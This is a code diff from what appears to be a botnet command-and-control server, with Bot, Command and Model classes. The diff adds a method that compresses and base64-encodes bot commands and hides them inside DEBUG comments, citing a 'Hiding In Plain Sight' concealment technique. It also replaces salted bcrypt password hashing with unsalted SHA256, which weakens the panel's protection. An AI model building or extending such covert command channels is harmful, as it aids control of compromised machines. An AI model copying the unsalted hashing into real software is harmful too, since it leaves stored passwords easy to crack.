@@ -9,7 +9,7 @@ from os import path
 from threading import RLock
 from zlib import compress
 
-import bcrypt
+from Cryptodome.Hash import SHA256
 
 
 class Bot:
@@ -47,16 +47,20 @@ class Command:
         self.payload = payload
         self.options = options
 
-    def __str__(self):
+    def get_network_format(self):
         """String representation of this class which can be sent over the network.
 
-        The format is split up into two parts, one which contains the payload, the other the options.
-        Each line is compressed, encoded with base64 then both surrounded with "DEBUG" comments.
+        The format is split up into two lines, one which contains the payload, the other the command's options.\n
+        Each line is compressed and encoded with base64.\n
+        These two lines are then encrypted and surrounded by DEBUG comments (from BlackHat's "Hiding In Plain Sight").
+
+        :rtype: str
         """
         formatted = "<--DEBUG:\n"
         formatted += b64encode(compress(self.payload.encode())).decode() + "\n"
         formatted += b64encode(compress(str(self.options).encode())).decode() + "\n"
         formatted += "DEBUG-->"
+
         return formatted
 
 
@@ -87,15 +91,15 @@ class Model:
         :type password: str
         """
         with self._lock:
-            encrypted_password = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
+            encrypted_password = SHA256.new(password.encode())
 
-            self._cursor.execute("INSERT OR REPLACE INTO settings(password) VALUES (?)", encrypted_password)
+            self._cursor.execute("INSERT OR REPLACE INTO settings(password) VALUES (?)", encrypted_password.hexdigest())
             self._database.commit()
 
     def get_password(self):
         """
         :return: The master password which protects UI access.
-        :rtype: bytes
+        :rtype: str
         """
         with self._lock:
             response = self._cursor.execute("SELECT password FROM settings").fetchone()
@@ -115,7 +119,7 @@ class Model:
         if not master_password:
             return False
         else:
-            return bcrypt.checkpw(password.encode(), master_password)
+            return SHA256.new(password.encode()).hexdigest() == master_password
 
     def set_inactive_time(self, minutes):
         """Sets the time after which bots will be shown as offline.
